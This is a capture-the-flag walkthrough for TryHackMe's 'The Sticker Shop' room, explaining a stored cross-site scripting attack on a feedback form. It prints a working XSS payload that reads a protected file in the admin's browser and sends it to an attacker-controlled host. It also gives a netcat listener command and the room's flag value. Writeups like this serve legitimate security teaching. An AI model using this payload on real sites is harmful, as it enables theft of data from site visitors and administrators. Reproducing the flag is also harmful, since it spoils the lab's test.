# 🏴‍☠️ TryHackMe – The Sticker Shop Walkthrough 🗿

**Room:** [The Sticker Shop](https://tryhackme.com/room/thestickershop)
**Description:** A practical demonstration of exploiting poor web security practices using Stored Cross-Site Scripting to extract sensitive server-side data.

<img width="958" height="312" alt="Cover" src="https://github.com/user-attachments/assets/df845336-77bc-4113-9882-12ad0629e431" /> <br/>

---

## 🧠 Background — Welcome to the Stickerverse

Your local sticker shop has taken a bold leap into the online world by launching its very own website. Unfortunately, their enthusiasm wasn’t backed by strong cybersecurity hygiene.
Instead of opting for basic security best practices, they decided to **host the website on the same system they use to browse customer feedback and probably check memes.**
Spoiler alert: this works in our favor 🗿

The objective? **Capture the flag located at `http://10.10.148.80:8080/flag.txt`.**
But here's the catch — accessing it directly gives you a cold slap of **401 Unauthorized.**
That’s where we get creative.

🛠️ Skills Involved:

* Web Reconnaissance
* Understanding of Stored XSS
* JavaScript Payload Crafting
* Exfiltration Techniques

🎯 Goal:

* Exploit the feedback feature using XSS
* Trick the admin into leaking the flag

---

## 🕵️‍♂️ Task 1: Reconnaissance – Exploring the Sticker Shop

We begin by accessing the web service hosted on port 8080:
`http://10.10.148.80:8080/`

What we’re greeted with is a simple storefront-style HTML page — nothing fancy. Basic static design, with limited user interaction features.

<img width="1915" height="1027" alt="Site" src="https://github.com/user-attachments/assets/7d23f620-dd15-439f-abd6-47fc7df6301f" /> <br/>

Initial reactions:

* No login functionality
* No hidden pages visible
* Just static content… and a **Feedback** section.

Now that's interesting. Feedback forms are often **vulnerable entry points**, especially in beginner-level misconfigured apps. Let’s look deeper.

---

## 💬 Task 2: The Feedback Functionality — Gateway to Exploitation

Clicking through to the feedback form, we’re able to submit arbitrary content to the shop. Once we submit feedback, we get this prompt:

> “Thanks for your feedback! It will be evaluated shortly by our staff.”

That’s **our first big clue.** 🧠
This clearly suggests that the feedback is actively reviewed by an admin or a staff member, likely through a browser.
So what happens if we submit something more… *interactive*? 🗿

<img width="1916" height="1034" alt="Feedback" src="https://github.com/user-attachments/assets/44d1132d-f55a-451b-8324-24a8d32b9b9b" /> <br/>

---

## ❌ Task 3: Direct Flag Access Attempt

Next, we try to brute-force our way into the flag file:
`http://10.10.148.80:8080/flag.txt`

And surprise, surprise —

> **401 Unauthorized**

The file exists, but we don’t have permissions to access it directly.
That means we need to find an **indirect method** of accessing it — ideally by exploiting a **client-side vulnerability** that’s executed **in the context of the authorized user**.

<img width="906" height="161" alt="Flag_Dir_Try" src="https://github.com/user-attachments/assets/6f578956-e7fd-4c51-b3f0-1ab9630335ac" /> <br/>

---

## 💥 Task 4: Crafting the XSS Payload – Weaponizing Feedback

Since the feedback is likely **read in-browser by the admin**, and they’re using the **same machine** that’s also hosting the vulnerable web server —
**we can exploit the feedback form using Stored Cross-Site Scripting (XSS).**

We craft a payload that:

1. Executes when the admin reads the feedback
2. Accesses `/flag.txt` (from the admin’s browser session)
3. Sends the flag data back to us via an external request

### 🧪 Final Payload:

```html
<script>
fetch('/flag.txt')
  .then(r => r.text())
  .then(data => fetch('http://<YOUR-IP>:<YOUR-PORT>/?flag=' + encodeURIComponent(data)));
</script>
```

Replace `<YOUR-IP>` and `<YOUR-PORT>` with your own listener’s IP and port. Once submitted, wait for the admin to read the feedback.
When that happens — boom, JS executes in their browser, and the flag is fetched and exfiltrated to your machine.

<img width="1901" height="424" alt="Payload" src="https://github.com/user-attachments/assets/e47729a5-05a8-4480-b1b8-d7e0e0291c60" /> <br/>

---

## 📡 Task 5: Setting Up the Listener

On your machine, spin up a listener to catch the exfiltrated flag. Any simple HTTP server or netcat listener works.

For example:

```bash
nc -nlvp 4444
```

Once the feedback is processed by the admin, you’ll receive a GET request containing the flag in the URL. That’s your trophy 🏆.

---

## 🎯 Mission Accomplished – Flag Captured

Here’s what came in:

```bash
GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D
```

Decoded:

```
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

<img width="1527" height="301" alt="Flag" src="https://github.com/user-attachments/assets/e78838c4-6584-413e-a166-9f2875fd7568" /> <br/>

---

## 🧠 What We Learned

This room is a **perfect demonstration of client-side attack surfaces being misused** due to poor architectural decisions. Let’s summarize the key takeaways:

### ⚠️ Mistakes Made by the Shop Owners:

* Hosting sensitive content (`flag.txt`) and admin viewing functionality on the **same system and domain**.
* Not **sanitizing or encoding input** in the feedback form — leaving it wide open to stored XSS.
* No implementation of **Content Security Policy (CSP)** or other browser security headers.

### ✅ Key Attacker Moves:

* **Passive Recon** to discover potentially unsafe user input vectors.
* **Strategic Payload Crafting** using JavaScript `fetch()` and exfiltration via GET requests.
* **Waiting for Admin Behavior** — letting the system compromise itself.

---

## 🫡 Outro — The Flag Was Sealed, But Bub Had the Key

Despite all their HTML and CSS efforts, the sticker shop forgot the #1 rule of the web:
**"Never trust user input."**
From `401 Unauthorized` to `THM{Owned}`, it was a matter of time before XSS came knocking on their door.

Room 100% ✅
Sticker shop? More like **Script Kiddie Buffet.**
Another day, another flag, another step toward full domination 🗿🔥

---
